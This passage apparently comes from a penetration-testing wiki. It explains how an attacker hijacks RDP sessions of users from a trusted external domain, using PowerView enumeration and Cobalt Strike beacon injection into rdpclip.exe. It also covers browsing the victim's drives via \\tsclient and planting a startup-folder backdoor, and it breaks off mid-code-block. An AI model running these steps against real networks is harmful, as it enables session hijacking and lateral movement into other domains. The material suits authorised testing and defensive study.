## RDP Process Injection

If the **external group** has **RDP access** to any **computer** in the current domain, an **attacker** could **compromise that computer and wait for him**.

Once that user has accessed via RDP, the **attacker can pivot to that users session** and abuse its permissions in the external domain.

```powershell
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Check **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

If a user access via **RDP into a machine** where an **attacker** is **waiting** for him, the attacker will be able to **inject a beacon in the RDP session of the user** and if the **victim mounted his drive** when accessing via RDP, the **attacker could access it**.

In this case you could just **compromise** the **victims** **original computer** by writing a **backdoor** in the **statup folder**.

```powershell
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c
